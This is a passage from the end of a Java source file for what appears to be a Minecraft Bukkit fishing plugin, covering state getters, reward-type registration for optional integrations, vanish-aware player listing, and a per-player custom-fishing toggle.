        return Bukkit.getPluginManager().isPluginEnabled("RedProtect");
    }

    private boolean checkWG() {
        return Bukkit.getPluginManager().isPluginEnabled("WorldGuard");
    }

    public Random getRandom() {
        return random;
    }

    public Permission getPermission() {
        return permission;
    }

    public Economy getEconomy() {
        return economy;
    }

    public Map<Integer, Set<String>> getFish() {
        return fish;
    }

    public Map<String, Bait> getBaits() {
        return baits;
    }

    public Map<Rarity, List<Fish>> getFishCollection() {
        return fishCollection;
    }

    public ItemStack getCustomNBTRod() {
        return customNBTRod;
    }

    public boolean isCheckingEatEvent() {
        return checkingEatEvent;
    }

    public void setCheckingEatEvent(boolean bool) {
        this.checkingEatEvent = bool;
    }

    public boolean isCheckingIntEvent() {
        return checkingIntEvent;
    }

    public void setCheckingIntEvent(boolean bool) {
        this.checkingIntEvent = bool;
    }

    public boolean isRaritiesCompCheckExempt() {
        return raritiesCompCheckExempt;
    }

    public void setRaritiesCompCheckExempt(boolean bool) {
        this.raritiesCompCheckExempt = bool;
    }

    public Competition getActiveCompetition() {
        return active;
    }

    public void setActiveCompetition(Competition competition) {
        this.active = competition;
    }

    public CompetitionQueue getCompetitionQueue() {
        return competitionQueue;
    }

    public PluginManager getPluginManager() {
        return pluginManager;
    }

    public int getMetricFishCaught() {
        return metric_fishCaught;
    }

    public void incrementMetricFishCaught(int value) {
        this.metric_fishCaught = (metric_fishCaught + value);
    }

    public int getMetricBaitsUsed() {
        return metric_baitsUsed;
    }

    public void incrementMetricBaitsUsed(int value) {
        this.metric_baitsUsed = (metric_baitsUsed + value);
    }

    public int getMetricBaitsApplied() {
        return metric_baitsApplied;
    }

    public void incrementMetricBaitsApplied(int value) {
        this.metric_baitsApplied = (metric_baitsApplied + value);
    }

    public Map<UUID, Rarity> getDecidedRarities() {
        return decidedRarities;
    }

    public boolean isUpdateAvailable() {
        return isUpdateAvailable;
    }

    public boolean isUsingVault() {return usingVault;}

    public boolean isUsingPAPI() {
        return usingPAPI;
    }

    public boolean isUsingMcMMO() {
        return usingMcMMO;
    }

    public boolean isUsingHeadsDB() {
        return usingHeadsDB;
    }

    public boolean isUsingPlayerPoints() {
        return usingPlayerPoints;
    }

    public boolean isUsingGriefPrevention() {return usingGriefPrevention;}

    public WorldGuardPlugin getWgPlugin() {
        return wgPlugin;
    }

    public String getGuardPL() {
        return guardPL;
    }

    public DatabaseV3 getDatabaseV3() {
        return databaseV3;
    }

    public HeadDatabaseAPI getHDBapi() {
        return HDBapi;
    }

    public void setHDBapi(HeadDatabaseAPI api) {
        this.HDBapi = api;
    }

    public EMFAPI getApi() {
        return api;
    }


    private void loadRewardManager() {
        // Load RewardManager
        RewardManager.getInstance().load();

        // Load RewardTypes
        new CommandRewardType().register();
        new EffectRewardType().register();
        new HealthRewardType().register();
        new HungerRewardType().register();
        new ItemRewardType().register();
        new MessageRewardType().register();
        new EXPRewardType().register();
        loadExternalRewardTypes();
    }

    private void loadExternalRewardTypes() {
        PluginManager pm = Bukkit.getPluginManager();
        if (pm.isPluginEnabled("PlayerPoints")) {
            new PlayerPointsRewardType().register();
        }
        if (pm.isPluginEnabled("GriefPrevention")) {
            new GPClaimBlocksRewardType().register();
        }
        if (pm.isPluginEnabled("AuraSkills")) {
            new AuraSkillsXPRewardType().register();
        }
        if (pm.isPluginEnabled("mcMMO")) {
            new McMMOXPRewardType().register();
        }
        // Only enable the PERMISSION type if Vault perms is found.
        if (getPermission() != null) {
            new PermissionRewardType().register();
        }
        // Only enable the MONEY type if the economy is loaded.
        if (getEconomy() != null && getEconomy().isEnabled()) {
            new MoneyRewardType().register();
        }
    }

    /**
     * Retrieves online players excluding those who are vanished.
     *
     * @return A list of online players excluding those who are vanished.
     */
    public List<Player> getOnlinePlayersExcludingVanish() {
        List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());

        if (!MainConfig.getInstance().shouldRespectVanish()) {
            return players;
        }

        // Check Essentials
        if (Bukkit.getPluginManager().isPluginEnabled("Essentials")) {
            Plugin plugin = Bukkit.getPluginManager().getPlugin("Essentials");
            if (plugin instanceof Essentials essentials) {
                players = players.stream().filter(player -> !essentials.getUser(player).isVanished()).collect(Collectors.toList());
            }
        }

        // Check CMI
        if (Bukkit.getPluginManager().isPluginEnabled("CMI")) {
            players = players.stream().filter(player -> !CMIUser.getUser(player).isVanished()).collect(Collectors.toList());
        }

        // Metadata check - A more generic way of checking if a player is vanished.
        // SuperVanish, PremiumVanish, and VanishNoPacket support this according to the SuperVanish Spigot page.
        players = players.stream().filter(player -> {
            for (MetadataValue meta : player.getMetadata("vanished")) {
                if (meta.asBoolean()) {
                    return false;
                }
            }
            return true;
        }).collect(Collectors.toList());

        return players;
    }


    // FISH TOGGLE METHODS
    // We use Strings here because Spigot 1.16.5 does not have PersistentDataType.BOOLEAN.

    public void performFishToggle(@NotNull Player player) {
        NamespacedKey key = new NamespacedKey(this, "fish-enabled");
        PersistentDataContainer pdc = player.getPersistentDataContainer();
        // If it is enabled, disable it
        if (isCustomFishing(player)) {
            pdc.set(key, PersistentDataType.STRING, "false");
            new Message(ConfigMessage.TOGGLE_OFF).broadcast(player, false);
        // If it is disabled, enable it
        } else {
            pdc.set(key, PersistentDataType.STRING, "true");
            new Message(ConfigMessage.TOGGLE_ON).broadcast(player, false);
        }
    }

    public boolean isCustomFishing(@NotNull Player player) {
        PersistentDataContainer pdc = player.getPersistentDataContainer();
        NamespacedKey key = new NamespacedKey(this, "fish-enabled");
        String toggleValue = pdc.getOrDefault(key, PersistentDataType.STRING, "true");
        return toggleValue.equals("true");
    }

}
